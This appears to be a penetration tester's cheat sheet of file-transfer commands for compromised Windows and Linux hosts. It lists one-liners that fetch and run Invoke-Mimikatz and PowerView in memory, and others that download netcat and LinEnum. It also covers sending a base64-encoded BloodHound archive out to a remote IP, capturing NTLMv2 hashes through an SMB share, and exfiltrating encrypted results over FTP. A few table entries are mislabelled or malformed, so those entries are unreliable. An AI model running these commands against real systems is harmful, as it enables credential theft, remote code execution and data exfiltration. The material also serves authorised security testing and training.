cd C:\Windows\Temp; mkdir <...>; cd <...>

| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 \| iex` | Alias iex |
| `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing \| iex` | Basic Parser |
| `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))` | Encoding b64 |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"` | Download using import |
| `certutil.exe -f -urlcache -split http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql` | Download |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |

Windows -> Linux

Linux -> `impacket-smbserver smbFolder $(pwd) -smb2support`

Windows -> `\\<ip>\smbFolder\<file>` -> Get Hashes NTLM v2


Windows via secure way

Windows Encript file

``Powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption.ps1 -Mode Encrypt -Key "s3cure-and-unique-p4ssw0rd" -Path .\scan-results.txt
``

Open FTP service on linux

``bash
pip3 install pyftpdlib
python3 -m pyftpdlib --user=pentester --password=s3cure-and-unique-p4ssw0rd -w
``

Windows transfer file via ftp
``
ftp
ftp> open <ip> <port>
User (10.10.14.2:(none)): <user>
Password: <password>
ftp> put scan-results.txt.aes
``

To decrypt the file again

``bash
¬ pwsh
PS> Import-Module Invoke-AESEncryption.ps1
PS> Invoke-AESEncryption -Mode Decrypt -Key "s3cure-and-unique-p4ssw0rd" -Path ./scan-results.txt.aes
``
